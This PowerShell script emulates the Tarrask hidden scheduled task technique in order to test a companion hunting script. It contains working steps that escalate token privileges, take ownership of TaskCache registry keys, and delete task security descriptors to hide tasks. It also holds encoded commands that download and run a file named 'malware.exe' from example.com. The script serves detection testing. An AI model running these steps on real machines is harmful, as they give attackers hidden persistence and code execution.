#Requires -Version 5.1
#Requires -RunAsAdministrator

<#
.SYNOPSIS
    Test-HiddenTaskAbuse.ps1 - Simulate Tarrask-style hidden scheduled task abuse for testing
    
.DESCRIPTION
    This script simulates the attack technique that Hunt-HiddenScheduledTasks.ps1 is designed to detect:
    1. Creates a scheduled task with suspicious content
    2. Manipulates the TaskCache registry to hide the task (Tarrask technique)
    3. Optionally executes the task to generate process events
    4. Leaves the task "hidden" for correlation detection
    
    ⚠️  WARNING: This script performs actual malicious techniques for testing purposes only!
    Only run in isolated test environments. Will create real scheduled tasks and modify registry.

.PARAMETER TaskName
    Name of the test task to create (default: auto-generated)
    
.PARAMETER CleanupAfterMinutes
    How long to wait before cleaning up test artifacts (default: 5 minutes)
    
.PARAMETER SkipExecution
    Don't execute the task, just create and hide it
    
.PARAMETER TestType
    Type of test to perform: Basic, Advanced, or Full (default: Basic)

.EXAMPLE
    .\Test-HiddenTaskAbuse.ps1
    
.EXAMPLE
    .\Test-HiddenTaskAbuse.ps1 -TestType Advanced -CleanupAfterMinutes 10

.NOTES
    Author: Michael Haag
    Purpose: Testing and validation of hidden task detection
    ⚠️  FOR TESTING ONLY - DO NOT USE MALICIOUSLY
#>

[CmdletBinding()]
param(
    [string]$TaskName = "TestHiddenTask_$(Get-Random)",
    [int]$CleanupAfterMinutes = 5,
    [switch]$SkipExecution,
    [ValidateSet("Basic", "Advanced", "Full")]
    [string]$TestType = "Basic"
)

function Write-TestLog {
    param([string]$Message, [string]$Level = "Info")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = switch($Level) {
        "Error" { "Red" }
        "Warning" { "Yellow" }
        "Success" { "Green" }
        "Critical" { "Magenta" }
        default { "Cyan" }
    }
    Write-Host "[$timestamp] [TEST] $Message" -ForegroundColor $color
}

function Grant-RegistryKeyAccess {
    param([string]$KeyPath)
    
    Write-TestLog "Attempting to gain registry access: $KeyPath" "Warning"
    try {
        $enablePrivilegeResult = Enable-RegistryPrivileges
        if (-not $enablePrivilegeResult) {
            Write-TestLog "Warning: Could not enable all required privileges" "Warning"
        }
        
        $acl = Get-Acl -Path $KeyPath -ErrorAction Stop
        
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $administrators = [System.Security.Principal.NTAccount]"BUILTIN\Administrators"
        
        $acl.SetOwner([System.Security.Principal.NTAccount]$currentUser)
        
        try {
            Set-Acl -Path $KeyPath -AclObject $acl -ErrorAction Stop
            Write-TestLog "Step 1: Ownership transferred to current user" "Info"
        } catch {
            Write-TestLog "Warning: Could not take ownership as user, trying Administrators" "Warning"
            $acl.SetOwner($administrators)
            Set-Acl -Path $KeyPath -AclObject $acl -ErrorAction Stop
        }
        
        $userRule = [System.Security.AccessControl.RegistryAccessRule]::new($currentUser, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $adminRule = [System.Security.AccessControl.RegistryAccessRule]::new($administrators, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        
        $acl.SetAccessRule($userRule)
        $acl.SetAccessRule($adminRule)
        
        Set-Acl -Path $KeyPath -AclObject $acl -ErrorAction Stop
        
        Write-TestLog "[SUCCESS] Successfully gained registry access" "Success"
        return $true
        
    } catch {
        Write-TestLog "[ERROR] Failed to gain registry access: $($_.Exception.Message)" "Error"
        return $false
    }
}

function Enable-RegistryPrivileges {
    try {
        $definition = @'
using System;
using System.Runtime.InteropServices;

public class AdvApi32 {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public long Luid;
        public int Attributes;
    }
}
'@
        
        if (-not ([System.Management.Automation.PSTypeName]'AdvApi32').Type) {
            Add-Type -TypeDefinition $definition
        }
        
        $processHandle = [AdvApi32]::GetCurrentProcess()
        $tokenHandle = [IntPtr]::Zero
        
        if ([AdvApi32]::OpenProcessToken($processHandle, 0x0020, [ref]$tokenHandle)) {
            $privileges = @("SeTakeOwnershipPrivilege", "SeRestorePrivilege", "SeBackupPrivilege")
            
            foreach ($privilege in $privileges) {
                $luid = 0
                if ([AdvApi32]::LookupPrivilegeValue($null, $privilege, [ref]$luid)) {
                    $tp = New-Object AdvApi32+TOKEN_PRIVILEGES
                    $tp.PrivilegeCount = 1
                    $tp.Luid = $luid
                    $tp.Attributes = 2 # SE_PRIVILEGE_ENABLED
                    
                    [AdvApi32]::AdjustTokenPrivileges($tokenHandle, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
                }
            }
        }
        
        return $true
    } catch {
        return $false
    }
}

function Get-TaskCommands {
    return @{
        "Basic" = "powershell.exe -WindowStyle Hidden -Command `"Write-Host 'Test task executed'`""
        "Advanced" = "powershell.exe -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABlAHMAdAAgAHQAYQBzAGsAIABlAHgAZQBjAHUAdABlAGQAJwA="  # "Write-Host 'Test task executed'" in Base64
        "Full" = "cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-WebRequest -Uri 'http://example.com/test' -OutFile 'C:\temp\test.txt'; Start-Sleep 5`""
    }
}

function New-TaskXmlTemplate {
    param(
        [string]$TaskName,
        [string]$Command,
        [string]$Description = "Test task for hidden task detection validation",
        [string]$Author = "$env:USERDOMAIN\$env:USERNAME",
        [string]$UserId = "$env:USERDOMAIN\$env:USERNAME",
        [string]$RunLevel = "HighestAvailable",
        [string]$LogonType = "InteractiveToken",
        [bool]$WithRepetition = $true
    )
    
    $commandParts = $Command.Split(' ', 2)
    $execCommand = $commandParts[0]
    $arguments = if ($commandParts.Length -gt 1) { $commandParts[1] } else { "" }
    
    $repetitionXml = if ($WithRepetition) {
        @"
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
"@
    } else { "" }
    
    return @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</Date>
    <Author>$Author</Author>
    <Description>$Description</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
$repetitionXml
      <StartBoundary>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$UserId</UserId>
      <LogonType>$LogonType</LogonType>
      <RunLevel>$RunLevel</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$execCommand</Command>
      <Arguments>$arguments</Arguments>
    </Exec>
  </Actions>
</Task>
"@
}

function Invoke-TaskCreationViaXml {
    param([string]$TaskName, [string]$XmlContent)
    
    $tempXmlPath = [System.IO.Path]::GetTempFileName()
    try {
        $XmlContent | Out-File -FilePath $tempXmlPath -Encoding unicode
        $result = schtasks.exe /create /tn $TaskName /xml $tempXmlPath /f 2>&1
        return ($LASTEXITCODE -eq 0)
    }
    finally {
        if (Test-Path $tempXmlPath) {
            Remove-Item $tempXmlPath -Force
        }
    }
}

function New-SuspiciousScheduledTask {
    param([string]$Name, [string]$Type)
    
    Write-TestLog "Creating suspicious scheduled task: $Name" "Info"
    
    $taskCommands = Get-TaskCommands
    $command = $taskCommands[$Type]
    
    try {
        # Method 1: Standard schtasks.exe (generates Security Event 4698)
        Write-TestLog "Creating task via schtasks.exe (Security Event 4698)..." "Info"
        
        # Create the scheduled task XML using helper function
        $taskXml = New-TaskXmlTemplate -TaskName $Name -Command $command
        
        # Register the task using schtasks
        if (Invoke-TaskCreationViaXml -TaskName $Name -XmlContent $taskXml) {
            Write-TestLog "[SUCCESS] Task created via schtasks.exe: $Name" "Success"
            Start-Sleep -Seconds 2
        } else {
            Write-TestLog "[FAILED] Failed to create task via schtasks" "Error"
            return $false
        }
        
        # Method 2: Programmatic creation via PowerShell (generates TaskScheduler Event 106)
        Write-TestLog "Creating task via PowerShell COM object (TaskScheduler Event 106)..." "Info"
        
        $AlternateTaskName = "${Name}_Programmatic"
        try {
            $taskService = New-Object -ComObject "Schedule.Service"
            $taskService.Connect()
            $taskFolder = $taskService.GetFolder("\")
            
            $taskDef = $taskService.NewTask(0)
            $taskDef.RegistrationInfo.Description = "Programmatically created test task"
            $taskDef.RegistrationInfo.Author = "$env:USERDOMAIN\$env:USERNAME"
            
            # Create trigger
            $triggers = $taskDef.Triggers
            $trigger = $triggers.Create(1) # Time trigger
            $trigger.StartBoundary = (Get-Date).AddMinutes(1).ToString("yyyy-MM-ddTHH:mm:ss")
            $trigger.Repetition.Interval = "PT10M"
            
            # Create action
            $actions = $taskDef.Actions
            $action = $actions.Create(0) # Executable action
            $action.Path = $command.Split(' ')[0]
            $action.Arguments = $command.Substring($command.IndexOf(' ') + 1)
            
            # Register the task
            [void]$taskFolder.RegisterTaskDefinition($AlternateTaskName, $taskDef, 6, $null, $null, 3)
            
            Write-TestLog "[SUCCESS] Task created via PowerShell COM: $AlternateTaskName" "Success"
            Start-Sleep -Seconds 2
            
            return @($Name, $AlternateTaskName)
            
        } catch {
            Write-TestLog "PowerShell COM creation failed: $($_.Exception.Message)" "Warning"
            if ($LASTEXITCODE -eq 0) {
                return @($Name)
            }
            return @()
        }
        
    } catch {
        Write-TestLog "Exception creating task: $($_.Exception.Message)" "Error"
        return $false
    }
}

function New-DirectRegistryTask {
    param([string]$TaskName)
    
    Write-TestLog "Creating task via direct registry manipulation..." "Critical"
    
    try {
        $taskGuid = [System.Guid]::NewGuid().ToString("B").ToUpper()
        $taskTreePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$TaskName"
        $taskHashPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$taskGuid"
        
        Write-TestLog "Creating registry keys for direct task creation..." "Warning"
        
        New-Item -Path $taskTreePath -Force | Out-Null
        Set-ItemProperty -Path $taskTreePath -Name "Id" -Value $taskGuid
        Set-ItemProperty -Path $taskTreePath -Name "Index" -Value 1
        
        $directTaskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</Date>
    <Author>DirectRegistry</Author>
    <Description>Task created via direct registry manipulation</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -Command "Write-Host 'Direct registry task executed'"</Arguments>
    </Exec>
  </Actions>
</Task>
"@
        
        New-Item -Path $taskHashPath -Force | Out-Null
        Set-ItemProperty -Path $taskHashPath -Name "Source" -Value "\$TaskName"
        Set-ItemProperty -Path $taskHashPath -Name "Author" -Value "DirectRegistry"
        Set-ItemProperty -Path $taskHashPath -Name "URI" -Value "\$TaskName"
        
        $xmlBytes = [System.Text.Encoding]::Unicode.GetBytes($directTaskXml)
        Set-ItemProperty -Path $taskHashPath -Name "Actions" -Value $xmlBytes -Type Binary
        Set-ItemProperty -Path $taskHashPath -Name "Triggers" -Value $xmlBytes -Type Binary
        
        Write-TestLog "[SUCCESS] Direct registry task created: $TaskName" "Critical"
        Write-TestLog "This task bypasses normal Task Scheduler APIs and should be detected!" "Warning"
        
        return $true
        
    } catch {
        Write-TestLog "Failed to create direct registry task: $($_.Exception.Message)" "Error"
        return $false
    }
}

function Hide-ScheduledTaskFromRegistry {
    param([string]$TaskName)
    
    Write-TestLog "Attempting to hide task using Tarrask technique..." "Warning"
    
    try {
        $taskCachePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$TaskName"
        
        if (Test-Path $taskCachePath) {
            Write-TestLog "Found task in registry: $taskCachePath" "Info"
            
            $originalSD = Get-ItemProperty -Path $taskCachePath -Name "SD" -ErrorAction SilentlyContinue
            
            if ($originalSD) {
                Write-TestLog "Current Security Descriptor found, removing to hide task..." "Warning"
                
                if (-not (Grant-RegistryKeyAccess -KeyPath $taskCachePath)) {
                    Write-TestLog "Failed to get necessary permissions. Trying alternative approach..." "Warning"
                }
                
                try {
                    Remove-ItemProperty -Path $taskCachePath -Name "SD" -Force -ErrorAction Stop
                    Write-TestLog "[SUCCESS] Security Descriptor removed - task is now hidden!" "Critical"
                    $hidingSuccess = $true
                } catch {
                    Write-TestLog "Registry modification failed: $($_.Exception.Message -replace 'Requested registry access is not allowed.', 'Registry access denied (expected on hardened systems)')" "Warning"
                    Write-TestLog "Attempting alternative hiding method..." "Info"
                    
                    try {
                        Set-ItemProperty -Path $taskCachePath -Name "SD" -Value @() -Type Binary -Force -ErrorAction Stop
                        Write-TestLog "[SUCCESS] Security Descriptor emptied - task should be hidden!" "Critical"
                        $hidingSuccess = $true
                    } catch {
                        Write-TestLog "Alternative method also failed - registry protections are effective" "Warning"
                        Write-TestLog "This is actually GOOD - your system is properly hardened against Tarrask" "Success"
                        Write-TestLog "The hunting script should still detect the registry access attempts via Sysmon" "Info"
                        $hidingSuccess = $false
                    }
                }
                
                if ($hidingSuccess) {
                    $verifyHidden = schtasks.exe /query /tn $TaskName 2>&1
                    if ($LASTEXITCODE -ne 0) {
                        Write-TestLog "[SUCCESS] Verification: Task is now hidden from schtasks.exe" "Success"
                        Write-TestLog "SUCCESS: Tarrask technique fully implemented!" "Critical"
                    } else {
                        Write-TestLog "Task still visible - hiding may have been incomplete" "Warning"
                    }
                } else {
                    Write-TestLog "Test Summary: Registry access was blocked (system hardening working)" "Info"
                    Write-TestLog "Detection Test: Check if Sysmon captured the registry access attempts" "Info"
                }
                
                return $hidingSuccess
            } else {
                Write-TestLog "No Security Descriptor found for task" "Warning"
                return $false
            }
        } else {
            Write-TestLog "Task not found in registry: $taskCachePath" "Error"
            return $false
        }
        
    } catch {
        Write-TestLog "Exception hiding task: $($_.Exception.Message)" "Error"
        return $false
    }
}

function Test-TaskModification {
    param([string]$TaskName)
    
    Write-TestLog "Testing task modification technique..." "Critical"
    
    try {
        $legitTaskName = "${TaskName}_LegitModified"
        
        Write-TestLog "Creating initial legitimate task..." "Info"
        $legitXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</Date>
    <Author>$env:USERDOMAIN\$env:USERNAME</Author>
    <Description>System maintenance task</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$env:USERDOMAIN\$env:USERNAME</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c echo "System maintenance complete"</Arguments>
    </Exec>
  </Actions>
</Task>
"@
        
        $tempXmlPath1 = [System.IO.Path]::GetTempFileName()
        try {
            $legitXml | Out-File -FilePath $tempXmlPath1 -Encoding unicode
            $result = schtasks.exe /create /tn $legitTaskName /xml $tempXmlPath1 /f 2>&1
        }
        finally {
            if (Test-Path $tempXmlPath1) {
                Remove-Item $tempXmlPath1 -Force
            }
        }
        
        if ($LASTEXITCODE -ne 0) {
            Write-TestLog "Failed to create initial task: $result" "Error"
            return $false
        }
        
        Write-TestLog "[SUCCESS] Initial legitimate task created" "Success"
        Start-Sleep -Seconds 3
        
        Write-TestLog "Modifying task to malicious payload (persistence technique)..." "Critical"
        
        $maliciousXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</Date>
    <Author>$env:USERDOMAIN\$env:USERNAME</Author>
    <Description>System maintenance task</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT30M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$env:USERDOMAIN\$env:USERNAME</UserId>
      <LogonType>S4U</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAdABlAG0AcABcAG0AYQBsAHcAYQByAGUALgBlAHgAZQAnADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJwBDADoAXAB0AGUAbQBwAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACcA</Arguments>
    </Exec>
  </Actions>
</Task>
"@
        # The base64 above decodes to: Invoke-WebRequest -Uri 'http://example.com/malware.exe' -OutFile 'C:\temp\malware.exe'; Start-Process 'C:\temp\malware.exe'
        
        # Delete and recreate task with malicious content (generates 4702 event)
        $result = schtasks.exe /delete /tn $legitTaskName /f 2>&1
        Start-Sleep -Seconds 1
        
        $tempXmlPath2 = [System.IO.Path]::GetTempFileName()
        try {
            $maliciousXml | Out-File -FilePath $tempXmlPath2 -Encoding unicode
            $result = schtasks.exe /create /tn $legitTaskName /xml $tempXmlPath2 /f 2>&1
        }
        finally {
            if (Test-Path $tempXmlPath2) {
                Remove-Item $tempXmlPath2 -Force
            }
        }
        
        if ($LASTEXITCODE -eq 0) {
            Write-TestLog "[SUCCESS] Task successfully modified to malicious payload!" "Critical"
            Write-TestLog "This should generate Event 4702 (task updated) with suspicious content" "Warning"
            
            Write-TestLog "Testing enable/disable evasion technique..." "Warning"
            
            schtasks.exe /change /tn $legitTaskName /disable 2>&1 | Out-Null
            Start-Sleep -Seconds 2
            schtasks.exe /change /tn $legitTaskName /enable 2>&1 | Out-Null
            Start-Sleep -Seconds 2
            schtasks.exe /change /tn $legitTaskName /disable 2>&1 | Out-Null
            
            Write-TestLog "[SUCCESS] Enable/disable evasion pattern completed" "Critical"
            
            return $legitTaskName
            
        } else {
            Write-TestLog "Failed to modify task: $result" "Error"
            return $false
        }
        
    } catch {
        Write-TestLog "Exception during task modification: $($_.Exception.Message)" "Error"
        return $false
    }
}

function Test-TaskExecution {
    param([string]$TaskName)
    
    if ($SkipExecution) {
        Write-TestLog "Skipping task execution (SkipExecution specified)" "Info"
        return
    }
    
    Write-TestLog "Testing task execution..." "Info"
    
    try {
        $result = schtasks.exe /run /tn $TaskName 2>&1
        
        if ($LASTEXITCODE -eq 0) {
            Write-TestLog "Task execution triggered successfully" "Success"
        } else {
            Write-TestLog "Task execution may have failed: $result" "Warning"
            Write-TestLog "This is expected if task is hidden - checking for process events..." "Info"
        }
        
        Start-Sleep -Seconds 3
        
    } catch {
        Write-TestLog "Exception during task execution: $($_.Exception.Message)" "Warning"
    }
}

function Cleanup-TestArtifacts {
    param(
        [string]$TaskName,
        [string[]]$AllTaskNames = @()
    )
    
    Write-TestLog "Cleaning up test artifacts..." "Info"
    
    $tasksToClean = @($TaskName)
    $tasksToClean += $AllTaskNames
    $tasksToClean += "${TaskName}_Programmatic"
    $tasksToClean += "${TaskName}_LegitModified"
    
    $cleanupSuccess = $true
    
    foreach ($taskToClean in ($tasksToClean | Select-Object -Unique)) {
        Write-TestLog "Cleaning up task: $taskToClean" "Info"
        
        try {
            $result = schtasks.exe /delete /tn $taskToClean /f 2>&1
            
            if ($LASTEXITCODE -eq 0) {
                Write-TestLog "[SUCCESS] Task deleted via schtasks: $taskToClean" "Success"
            } else {
                Write-TestLog "Normal deletion failed (expected for hidden task): $result" "Warning"
                
                $taskCachePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskToClean"
                if (Test-Path $taskCachePath) {
                    try {
                        Grant-RegistryKeyAccess -KeyPath $taskCachePath | Out-Null
                        Remove-Item -Path $taskCachePath -Recurse -Force -ErrorAction Stop
                        Write-TestLog "[SUCCESS] Removed task from registry: $taskToClean" "Success"
                    } catch {
                        Write-TestLog "Failed to remove registry entry for $taskToClean`: $($_.Exception.Message)" "Warning"
                        $cleanupSuccess = $false
                    }
                }
                
                try {
                    $taskCacheTasksPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks"
                    $taskGuids = Get-ChildItem -Path $taskCacheTasksPath -ErrorAction SilentlyContinue | ForEach-Object {
                        $taskData = Get-ItemProperty -Path $_.PSPath -Name "URI" -ErrorAction SilentlyContinue
                        if ($taskData.URI -eq "\$taskToClean") {
                            return $_.PSChildName
                        }
                    }
                    
                    foreach ($guid in $taskGuids) {
                        $guidPath = "$taskCacheTasksPath\$guid"
                        Remove-Item -Path $guidPath -Recurse -Force -ErrorAction SilentlyContinue
                        Write-TestLog "[SUCCESS] Removed task store entry: $guid" "Success"
                    }
                } catch {
                    Write-TestLog "Failed to clean task store entries: $($_.Exception.Message)" "Warning"
                }
            }
            
        } catch {
            Write-TestLog "[ERROR] Exception during cleanup of $taskToClean`: $($_.Exception.Message)" "Error"
            $cleanupSuccess = $false
        }
    }
    
    try {
        $tempFiles = Get-ChildItem -Path $env:TEMP -Filter "*task*" -ErrorAction SilentlyContinue | Where-Object { $_.CreationTime -gt (Get-Date).AddHours(-1) }
        foreach ($file in $tempFiles) {
            Remove-Item $file.FullName -Force -ErrorAction SilentlyContinue
        }
    } catch {
    }
    
    if ($cleanupSuccess) {
        Write-TestLog "[SUCCESS] Cleanup completed successfully" "Success"
    } else {
        Write-TestLog "Cleanup completed with some warnings" "Warning"
    }
    
    return $cleanupSuccess
}

# Main execution
try {
    Write-TestLog "Starting Hidden Task Abuse Test" "Success"
    Write-TestLog "Test Type: $TestType" "Info"
    Write-TestLog "Task Name: $TaskName" "Info"

    $createdTasks = New-SuspiciousScheduledTask -Name $TaskName -Type $TestType
    if (-not $createdTasks) {
        Write-TestLog "Failed to create test tasks" "Error"
        exit 1
    }

    Write-TestLog "[SUCCESS] Test tasks created successfully: $($createdTasks -join ', ')" "Success"

    $hiddenTask = $createdTasks[0]
    $hidingResult = Hide-ScheduledTaskFromRegistry -TaskName $hiddenTask
    if ($hidingResult) {
        Write-TestLog "[SUCCESS] Task successfully hidden using Tarrask technique!" "Critical"
        Write-TestLog "This demonstrates a successful advanced persistence technique" "Critical"
    } else {
        Write-TestLog "Task hiding failed - but this is actually good security!" "Warning"
        Write-TestLog "Your system's registry protections prevented the Tarrask technique" "Success"
        Write-TestLog "The hunt script should still detect the registry access attempts" "Info"
    }

    if ($createdTasks.Count -gt 1) {
        $modifiedTask = Test-TaskModification -TaskName $hiddenTask
        if ($modifiedTask) {
            Write-TestLog "[SUCCESS] Task modification test completed: $modifiedTask" "Critical"
        }
    }

    if (-not $SkipExecution) {
        Test-TaskExecution -TaskName $hiddenTask
    }

    Write-TestLog "Test setup complete. Tasks will be cleaned up after $CleanupAfterMinutes minutes" "Info"

    $allCreatedTasks = @()
    if ($createdTasks) {
        $allCreatedTasks += $createdTasks
    }
    if ($modifiedTask) {
        $allCreatedTasks += $modifiedTask
    }

    if ($CleanupAfterMinutes -gt 0) {
        Write-TestLog "Scheduling cleanup in $CleanupAfterMinutes minutes..." "Info"
        
        $escapedTasks = @()
        if ($allCreatedTasks) { $escapedTasks = $allCreatedTasks | ForEach-Object { ($_ -replace "'", "''") } }
        $allTasksArrayLiteral = ($escapedTasks | ForEach-Object { "'$_'" }) -join ", "

        $cleanupScript = @"
# Auto-cleanup script for test artifacts
Write-Host "Starting automatic cleanup of test artifacts..." -ForegroundColor Yellow

# Import the cleanup function
. '$($MyInvocation.MyCommand.Path)'

# Run cleanup
Cleanup-TestArtifacts -TaskName '$TaskName' -AllTaskNames @($allTasksArrayLiteral)

Write-Host "Automatic cleanup completed." -ForegroundColor Green
"@
        
        # Save cleanup script to temp file
        $cleanupScriptPath = Join-Path $env:TEMP "TaskHunter_Cleanup_$(Get-Date -Format 'yyyyMMdd_HHmmss').ps1"
        $cleanupScript | Out-File -FilePath $cleanupScriptPath -Encoding UTF8
        
        # Schedule the cleanup using a temporary scheduled task
        $cleanupTaskName = "TaskHunter_AutoCleanup_$(Get-Random)"
        $cleanupTime = (Get-Date).AddMinutes($CleanupAfterMinutes).ToString("yyyy-MM-ddTHH:mm:ss")
        
        $cleanupTaskXml = New-TaskXmlTemplate -TaskName $cleanupTaskName -Command "powershell.exe -ExecutionPolicy Bypass -File `"$cleanupScriptPath`"" -Description "Auto-cleanup for TaskHunter test artifacts" -WithRepetition $false
        
        if (Invoke-TaskCreationViaXml -TaskName $cleanupTaskName -XmlContent $cleanupTaskXml) {
            Write-TestLog "[SUCCESS] Auto-cleanup scheduled for $(Get-Date -Date $cleanupTime -Format 'HH:mm:ss')" "Success"
        } else {
            Write-TestLog "Failed to schedule auto-cleanup. Manual cleanup required." "Warning"
            Write-TestLog "To clean up manually, run: Cleanup-TestArtifacts -TaskName '$TaskName' -AllTaskNames @($($allCreatedTasks -join ', '))" "Info"
        }
    } else {
        Write-TestLog "To clean up manually, run: Cleanup-TestArtifacts -TaskName '$TaskName' -AllTaskNames @($($allCreatedTasks -join ', '))" "Info"
    }
    
    Write-TestLog "`nTEST SUMMARY:" "Success"
    Write-TestLog "=================" "Success"
    Write-TestLog "Tasks Created: $($allCreatedTasks.Count + 1) (including base task)" "Info"
    Write-TestLog "Registry Hiding: $(if($hidingResult){'SUCCESS - Tarrask implemented'}else{'BLOCKED - System hardened'})" "Info"
    Write-TestLog "Task Modification: $(if($modifiedTask){'SUCCESS - Persistence technique demonstrated'}else{'FAILED'})" "Info"
    Write-TestLog "Detection Value: All activities should be visible to the hunting script" "Info"
    Write-TestLog "`nNext Steps:" "Info"
    Write-TestLog "1. Run Hunt-HiddenScheduledTasks.ps1 to validate detection" "Info"
    Write-TestLog "2. Check Sysmon logs for registry manipulation events" "Info"
    Write-TestLog "3. Review Security log for task creation/modification events" "Info"
    if (-not $hidingResult) {
        Write-TestLog "4. Your system successfully resisted the Tarrask technique!" "Success"
    }

} catch {
    Write-TestLog "Test failed: $($_.Exception.Message)" "Error"
    throw
}
